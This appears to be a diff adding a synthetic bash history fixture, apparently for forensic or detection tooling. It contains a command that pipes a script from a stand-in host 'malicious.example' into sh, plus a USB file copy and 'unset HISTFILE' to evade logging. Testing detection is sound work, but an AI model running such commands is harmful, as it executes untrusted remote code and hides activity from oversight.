@@ -1,0 +1,12 @@
+#1781326158
+cd /home/analyst/work
+#1781326159
+ls -la /tmp
+#1781326160
+curl http://malicious.example/payload.sh | sh
+#1781326161
+cp /home/analyst/work/report.docx /media/usb0/report.docx
+#1781326162
+unset HISTFILE
+#1781326162
+history -w /tmp/uac_gen_history
